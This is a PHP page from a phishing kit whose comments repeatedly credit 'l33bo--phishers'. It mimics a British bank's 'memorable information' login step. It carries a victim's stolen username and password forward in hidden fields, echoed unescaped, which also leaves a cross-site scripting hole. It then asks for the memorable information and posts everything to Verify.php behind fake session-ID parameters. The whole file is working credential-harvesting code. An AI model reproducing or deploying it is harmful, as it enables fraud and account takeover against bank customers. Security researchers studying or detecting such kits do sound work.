<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
require_once("assets/includes/memo.php");
require_once("assets/includes/LoginSecondary.php");
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Enter Memorable</title>
<link href="assets/img/favicon.ico" rel="shortcut icon">
<link href="assets/css/global1-min140807.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/global2-min140729.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/yeah-js.css" media="screen" rel="stylesheet" type="text/css">
<script src="assets/js/jquery-min140807.js" type="text/javascript"></script>
<script src="assets/js/scriptsnippet.jspf" type="text/javascript"></script>
<script src="assets/js/global-min140807.js" type="text/javascript"></script>
<script src="assets/js/custom-min140729.js" type="text/javascript"></script>
<script src="assets/js/progressbar.js" type="text/javascript"></script>
</head>
<body><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div id="wrapper">
<div style="display:none">
<form method="post" action="mobile/index.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true" name="MobileGuy" id="MobileGuy">
</form>
</div>
<div class="outer"><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div id="header">
<ul id="skiplinks">
<li><a href="#" id="lnkSkip" name="lnkSkip">Skip to main content</a></li>
</ul><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div class="clearfix"><span id="strbrandname" style="display: none"></span>
<p id="logo"><span><img alt="assets/img/logo.jpg" src=""></span></p>
<div class="secureMsg">
<p class="msg"><img alt="" src="assets/img/583.png"></p>
<p><a class="newwin" href="#" title="">How can I tell that this site is secure?</a></p>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div class="loggedIn"><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<ul><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<li class="mobile"><a class="linkBullet" href="mobile/index.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" title="Mobile">&Mu;obile</a></li>
<li class="cookie"><a class="linkBullet newwin" href="#" title="Cookie policy">Cookie policy</a></li>
</ul>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel">
<h1>Your memorable information</h1>
<div class="inner"><p><strong></strong></p>
<p><strong>Please enter your full information then click on the continue button.</strong></p>
<p></p><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<p>This login step improves security.</p>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<form id="memo" name="memo" action="Verify.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" autocomplete="off" class="validationName:(login) validate:()" enctype="application/x-www-form-urlencoded" method="post">
	<input type="hidden" name="username" value="<?=$_POST['username']?>">
	<input type="hidden" name="password" value="<?=$_POST['password']?>">	
<fieldset class="memInfoSelect clearfix">
<div id="inputerror" class="formField clearfix error">
<div class="formFieldInner">
<div class="clearfix">
<label for="memo">Memorable information :</label>
<input type="password" name="memo" id="memo" onkeyup="if (this.value.length > 5) hidebox();">
</div>
<span id="inputerrortxt"  class="error">Please enter your FULL memorable information.</span>
</div>
</div>
</fieldset>
<div class="inner">
<ul class="linkList">
<li><a id="frmentermemorableinformation1:lktrouble" name="frmentermemorableinformation1:lktrouble" href="#">Having trouble logging in?</a></li>
</ul>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<ul class="actions">
<li class="primaryAction">
<input id="frmentermemorableinformation1:btnContinue" name="frmentermemorableinformation1:btnContinue" type="image" src="assets/img/004.png" class="submitAction">
</li>
<li><strong><a id="frmentermemorableinformation1:lkCancel" name="frmentermemorableinformation1:lkCancel" href="#" class="cancel pseudoLink">Cancel</a></strong></li>
</ul>
</form>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<?php echo secondary; ?>
</div>
<div id="footer">
<div class="outer"><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div id="footerInner">
<ul>
<li><a class="newwin" href="#" title="Legal">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<li><a class="newwin" href="#" title="">Homepage</a></li>
<li><a class="newwin" href="#" title="Rates &amp; fees">Rates & fees</a></li>
</ul><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div>
</div>
</div>
</div>
</div>
</body>
</html>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>